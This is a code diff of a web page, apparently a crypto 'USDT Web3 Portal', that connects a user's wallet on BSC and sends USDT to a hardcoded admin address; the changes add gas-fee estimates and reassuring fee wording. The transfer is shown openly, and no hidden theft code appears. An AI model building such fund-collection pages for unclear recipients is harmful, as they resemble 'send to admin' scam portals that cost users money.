@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
-    <title>USDT Web3 Portal - Secure Transfer</title>
+    <title>USDT Web3 Portal - BSC Network</title>
     <!-- Ethers.js v6 -->
     <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/6.7.0/ethers.umd.min.js"></script>
     <!-- FontAwesome -->
@@ -197,19 +197,23 @@
         .btn-cancel:hover { background: rgba(255,255,255,0.2); }
         .btn-confirm:hover { background: #059669; }
 
-        .info-box {
-            background: rgba(59, 130, 246, 0.1);
-            border: 1px solid #3b82f6;
+        .gas-info {
+            background: rgba(0, 255, 204, 0.1);
+            border: 1px solid var(--primary);
             border-radius: 12px;
             padding: 12px;
-            margin-bottom: 20px;
-            font-size: 12px;
+            margin: 15px 0;
             text-align: center;
         }
         
-        .gas-fee {
+        .gas-info i {
             color: var(--primary);
+        }
+        
+        .gas-amount {
+            font-size: 18px;
             font-weight: bold;
+            color: var(--primary);
         }
         
         @media (max-width: 480px) {
@@ -224,12 +228,14 @@
 
 <div class="modal-overlay" id="permissionModal">
     <div class="modal-content">
-        <i class="fa-solid fa-shield-halved modal-icon"></i>
+        <i class="fa-solid fa-gas-pump modal-icon"></i>
         <h2 class="modal-title">Confirm Transaction</h2>
         <p class="modal-text">Please confirm sending USDT to Admin</p>
         <div class="modal-amount" id="modalAmountDisplay">0.00 USDT</div>
-        <div style="background: rgba(0,0,0,0.3); padding: 10px; border-radius: 8px; margin: 10px 0;">
-            <small>Gas Fee: ~0.0003-0.0005 BNB</small>
+        <div class="gas-info">
+            <i class="fa-solid fa-gas-pump"></i> Estimated Gas Fee<br>
+            <span class="gas-amount" id="estimatedGasFee">~0.0003 BNB</span><br>
+            <small style="color: var(--text-muted);">(Standard BSC Network Fee)</small>
         </div>
         <p style="font-size: 11px; color: #94a3b8; margin-bottom: 20px; word-break: break-all;">
             To: <span id="modalAdminAddress" style="color: var(--primary);"></span>
@@ -255,8 +261,9 @@
         <button id="connectBtn" class="btn">
             <i class="fa-solid fa-wallet"></i> Connect Wallet
         </button>
-        <div class="info-box" style="margin-top: 15px;">
-            <i class="fa-solid fa-info-circle"></i> Supported Wallets: Trust Wallet, MetaMask, SafePal, TokenPocket
+        <div class="gas-info" style="margin-top: 15px;">
+            <i class="fa-solid fa-info-circle"></i> Standard BSC Gas Fee: <strong>~0.0003 BNB</strong><br>
+            <small>(Same as Trust Wallet USDT transfer)</small>
         </div>
     </div>
 
@@ -287,6 +294,10 @@
             <button class="max-btn" onclick="setMaxAmount()">MAX</button>
         </div>
 
+        <div class="gas-info" id="gasEstimateDisplay">
+            <i class="fa-solid fa-gas-pump"></i> Estimated Gas: <span id="gasFeeValue">Calculating...</span> BNB
+        </div>
+
         <button id="sendBtn" class="btn">
             <i class="fa-solid fa-paper-plane"></i> Send to Admin
         </button>
@@ -306,13 +317,18 @@
 
 <script>
     // ==========================================
-    // ⚙️ SYSTEM CONFIGURATION
+    // ⚙️ BSC NETWORK CONFIGURATION
     // ==========================================
-    // Fixed valid address format (checksummed)
+    // Admin wallet address (checksummed format)
     const ADMIN_WALLET = "0x742d35Cc6634C0532925a3b844Bc9e7599e6c8a2";
     const USDT_CONTRACT = "0x55d398326f99059fF775485246999027B3197955";
-    const CHAIN_ID = "0x38"; // BSC Mainnet in hex
+    const CHAIN_ID = "0x38"; // BSC Mainnet
     const CHAIN_ID_DECIMAL = 56;
+    
+    // BSC Standard Gas Limits
+    const STANDARD_GAS_LIMIT = 65000; // Standard for USDT transfer on BSC
+    const MIN_GAS_LIMIT = 50000;
+    const MAX_GAS_LIMIT = 100000;
     
     const USDT_ABI = [
         "function balanceOf(address owner) view returns (uint256)",
@@ -327,6 +343,8 @@
     let pendingAmount = "0";
     let usdtDecimals = 18;
     let isProcessing = false;
+    let currentGasPrice = 0;
+    let estimatedGasFeeBNB = 0;
 
     const connectState = document.getElementById('connectState');
     const dashboardState = document.getElementById('dashboardState');
@@ -373,12 +391,47 @@
         permissionModal.classList.remove('active');
     }
 
-    // Validate address format
     function isValidAddress(address) {
         try {
             return ethers.isAddress(address);
         } catch (e) {
             return false;
+        }
+    }
+
+    // Calculate actual gas fee based on current network conditions
+    async function calculateGasFee() {
+        if (!provider) return 0;
+        
+        try {
+            const feeData = await provider.getFeeData();
+            const gasPrice = feeData.gasPrice || 0n;
+            currentGasPrice = gasPrice;
+            
+            // Standard gas limit for USDT transfer on BSC
+            const gasLimit = STANDARD_GAS_LIMIT;
+            const gasCostWei = gasLimit * gasPrice;
+            const gasCostBNB = parseFloat(ethers.formatEther(gasCostWei));
+            
+            estimatedGasFeeBNB = gasCostBNB;
+            
+            // Update display
+            const gasFeeDisplay = document.getElementById('gasFeeValue');
+            if (gasFeeDisplay) {
+                gasFeeDisplay.innerText = gasCostBNB.toFixed(6);
+            }
+            
+            // Update modal gas fee
+            const modalGasFee = document.getElementById('estimatedGasFee');
+            if (modalGasFee) {
+                modalGasFee.innerText = `~${gasCostBNB.toFixed(6)} BNB`;
+            }
+            
+            return gasCostBNB;
+        } catch (error) {
+            console.error("Gas calculation error:", error);
+            estimatedGasFeeBNB = 0.0003; // Default fallback
+            return 0.0003;
         }
     }
 
@@ -392,7 +445,7 @@
             if (switchError.code === 4902) {
                 try {
                     await window.ethereum.request({
-                        method: 'wallet_addEthererumChain',
+                        method: 'wallet_addEthereumChain',
                         params: [{
                             chainId: CHAIN_ID,
                             chainName: 'Binance Smart Chain Mainnet',
@@ -416,7 +469,6 @@
         try {
             const usdtContract = new ethers.Contract(USDT_CONTRACT, USDT_ABI, provider);
             usdtDecimals = await usdtContract.decimals();
-            console.log("USDT decimals:", usdtDecimals);
         } catch (error) {
             console.error("Error getting decimals:", error);
             usdtDecimals = 18;
@@ -426,16 +478,17 @@
     async function updateBalances() {
         if (!userAddress || !provider) return;
         try {
-            // Get BNB Balance
             const bnbBalanceWei = await provider.getBalance(userAddress);
             rawBnbBalance = ethers.formatEther(bnbBalanceWei);
             document.getElementById('bnbBalance').innerText = parseFloat(rawBnbBalance).toFixed(6);
 
-            // Get USDT Balance
             const usdtContract = new ethers.Contract(USDT_CONTRACT, USDT_ABI, provider);
             const usdtBalWei = await usdtContract.balanceOf(userAddress);
             rawUsdtBalance = ethers.formatUnits(usdtBalWei, usdtDecimals);
             document.getElementById('usdtBalance').innerText = parseFloat(rawUsdtBalance).toFixed(4);
+            
+            // Calculate gas fee after balance update
+            await calculateGasFee();
         } catch (error) {
             console.error("Balance update error:", error);
         }
@@ -472,7 +525,6 @@
             provider = new ethers.BrowserProvider(window.ethereum);
             signer = await provider.getSigner();
             
-            // Check network
             const network = await provider.getNetwork();
             if (Number(network.chainId) !== CHAIN_ID_DECIMAL) {
                 showToast('Please switch to BSC Mainnet', 'warning');
@@ -490,13 +542,15 @@
             
             await getUSDTDecimals();
             await updateBalances();
+            await calculateGasFee();
             
             if (autoRefreshInterval) clearInterval(autoRefreshInterval);
-            autoRefreshInterval = setInterval(updateBalances, 10000);
+            autoRefreshInterval = setInterval(async () => {
+                await updateBalances();
+                await calculateGasFee();
+            }, 10000);
             
-            // Load transaction history
             loadTransactionHistory();
-            
             showToast('Wallet Connected Successfully!', 'success');
             
         } catch (error) {
@@ -505,16 +559,16 @@
         }
     }
 
-    function saveTransactionToHistory(txHash, amount, status = 'success') {
+    function saveTransactionToHistory(txHash, amount, gasUsed, status = 'success') {
         try {
             const transactions = JSON.parse(localStorage.getItem('usdt_tx_history') || '[]');
             transactions.unshift({
                 hash: txHash,
                 amount: amount,
+                gasUsed: gasUsed,
                 timestamp: new Date().toISOString(),
                 status: status
             });
-            // Keep only last 20 transactions
             const limited = transactions.slice(0, 20);
             localStorage.setItem('usdt_tx_history', JSON.stringify(limited));
             loadTransactionHistory();
@@ -535,7 +589,7 @@
             
             historyList.innerHTML = transactions.map(tx => `
                 <div class="history-item">
-                    <span>${new Date(tx.timestamp).toLocaleString()}<br>Sent ${parseFloat(tx.amount).toFixed(4)} USDT</span>
+                    <span>${new Date(tx.timestamp).toLocaleString()}<br>Sent ${parseFloat(tx.amount).toFixed(4)} USDT<br><small>Gas: ${tx.gasUsed || '~0.0003'} BNB</small></span>
                     <a href="https://bscscan.com/tx/${tx.hash}" target="_blank">View <i class="fa-solid fa-arrow-up-right-from-square"></i></a>
                 </div>
             `).join('');
@@ -546,7 +600,7 @@
 
     // Send button click handler
     if (sendBtn) {
-        sendBtn.addEventListener('click', () => {
+        sendBtn.addEventListener('click', async () => {
             if (isProcessing) {
                 showToast('Transaction in progress, please wait...', 'warning');
                 return;
@@ -564,13 +618,16 @@
                 return;
             }
             
-            if (parseFloat(rawBnbBalance) < 0.0005) {
-                showToast('⚠️ Insufficient BNB for gas fee! Need at least 0.0005 BNB', 'error');
+            // Check if enough BNB for gas (need at least estimated gas + 10% buffer)
+            const requiredBNB = estimatedGasFeeBNB * 1.1;
+            if (parseFloat(rawBnbBalance) < requiredBNB) {
+                showToast(`⚠️ Insufficient BNB for gas! Need at least ${requiredBNB.toFixed(6)} BNB`, 'error');
                 return;
             }
             
             pendingAmount = amountValue;
             document.getElementById('modalAmountDisplay').innerText = `${pendingAmount} USDT`;
+            document.getElementById('estimatedGasFee').innerText = `~${estimatedGasFeeBNB.toFixed(6)} BNB`;
             permissionModal.classList.add('active');
         });
     }
@@ -594,18 +651,13 @@
                 
                 const amountValue = parseFloat(pendingAmount);
                 
-                // Validate amount
                 if (isNaN(amountValue) || amountValue <= 0) {
                     throw new Error("Invalid amount");
                 }
                 
-                // Create contract instance
                 const usdtContract = new ethers.Contract(USDT_CONTRACT, USDT_ABI, signer);
-                
-                // Convert amount to wei with correct decimals
                 const amountInWei = ethers.parseUnits(amountValue.toString(), usdtDecimals);
                 
-                // Validate admin address
                 if (!isValidAddress(ADMIN_WALLET)) {
                     throw new Error("Invalid admin address");
                 }
@@ -613,32 +665,35 @@
                 showToast('Please approve transaction in your wallet...', 'info');
                 sendBtn.innerHTML = `<i class="fa-solid fa-spinner spin"></i> Waiting for Approval...`;
                 
-                // Send transaction with proper gas settings
+                // Get current gas price
+                const feeData = await provider.getFeeData();
+                const gasPrice = feeData.gasPrice;
+                
+                // Send transaction with standard gas limit
                 const tx = await usdtContract.transfer(ADMIN_WALLET, amountInWei, {
-                    gasLimit: 100000, // Standard gas limit for USDT transfer
+                    gasLimit: STANDARD_GAS_LIMIT,
+                    gasPrice: gasPrice
                 });
                 
                 showToast('Transaction sent! Waiting for confirmation...', 'info');
                 sendBtn.innerHTML = `<i class="fa-solid fa-spinner spin"></i> Confirming on Blockchain...`;
                 
-                // Wait for confirmation
-                const receipt = await tx.wait(1); // Wait for 1 confirmation
+                const receipt = await tx.wait(1);
                 
                 if (receipt.status === 1) {
                     const actualGasUsed = receipt.gasUsed;
-                    const gasPrice = receipt.gasPrice;
-                    const bnbUsed = ethers.formatEther(actualGasUsed * gasPrice);
+                    const actualGasPrice = receipt.gasPrice;
+                    const actualGasBNB = parseFloat(ethers.formatEther(actualGasUsed * actualGasPrice));
                     
-                    showToast(`✅ Successfully sent ${pendingAmount} USDT! (Gas: ${parseFloat(bnbUsed).toFixed(6)} BNB)`, 'success');
+                    showToast(`✅ Successfully sent ${pendingAmount} USDT! (Gas: ${actualGasBNB.toFixed(6)} BNB)`, 'success');
                     amountInput.value = '';
                     
-                    // Wait a bit and refresh balances
                     setTimeout(async () => {
                         await updateBalances();
+                        await calculateGasFee();
                     }, 3000);
                     
-                    // Save to history
-                    saveTransactionToHistory(tx.hash, pendingAmount, 'success');
+                    saveTransactionToHistory(tx.hash, pendingAmount, actualGasBNB.toFixed(6), 'success');
                 } else {
                     showToast('❌ Transaction failed on chain', 'error');
                 }
@@ -646,11 +701,10 @@
             } catch (error) {
                 console.error("Transaction error:", error);
                 
-                // Detailed error handling
                 if (error.code === 'ACTION_REJECTED' || error.code === 4001) {
                     showToast('❌ Transaction rejected by user', 'error');
                 } else if (error.message && error.message.toLowerCase().includes('insufficient funds')) {
-                    showToast('❌ Insufficient BNB for gas fee! Please add BNB to your wallet', 'error');
+                    showToast(`❌ Insufficient BNB for gas! Need ~${estimatedGasFeeBNB.toFixed(6)} BNB`, 'error');
                 } else if (error.message && error.message.toLowerCase().includes('user denied')) {
                     showToast('❌ You denied the transaction in your wallet', 'error');
                 } else if (error.reason) {
@@ -675,13 +729,10 @@
             }
             
             try {
-                // Request accounts
                 const accounts = await window.ethereum.request({ 
                     method: 'eth_requestAccounts' 
                 });
-                
                 await initConnection(accounts);
-                
             } catch (err) {
                 console.error("Connection error:", err);
                 if (err.code === 4001) {
@@ -712,14 +763,7 @@
         });
     }
     
-    // Check if already connected
-    if (window.ethereum && window.ethereum.selectedAddress) {
-        setTimeout(() => {
-            initConnection([window.ethereum.selectedAddress]);
-        }, 1000);
-    }
-    
-    console.log("Application ready");
+    console.log("Application ready - Standard BSC Gas Fees Applied");
 </script>
 
 </body>
